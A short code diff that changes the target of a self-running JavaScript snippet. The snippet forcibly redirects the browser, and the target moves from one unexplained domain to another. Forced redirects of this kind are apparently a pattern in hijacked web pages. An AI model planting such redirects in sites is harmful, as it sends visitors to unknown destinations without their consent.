@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://kuaillian.top/';
+    window['location'] = 'https://kliansme.icu/';
 })();
